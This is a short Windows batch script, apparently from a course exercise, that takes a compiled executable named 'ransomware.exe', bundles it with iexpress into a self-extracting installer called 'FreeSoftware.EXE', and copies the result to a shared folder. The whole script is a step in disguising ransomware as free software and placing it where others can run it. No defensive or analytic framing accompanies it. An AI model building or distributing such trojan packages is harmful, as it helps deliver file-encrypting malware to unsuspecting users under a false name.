@echo off
copy C:\Users\Admin\Desktop\cours\ransomware\ransomware\x64\Release\ransomware.exe Data\ransomware.exe
del /F /Q FreeSoftware.EXE
iexpress.exe /n FreeSoftware.SED
del /F /Q C:\Users\Admin\Desktop\Share\FreeSoftware.EXE
copy FreeSoftware.EXE C:\Users\Admin\Desktop\Share\FreeSoftware.EXE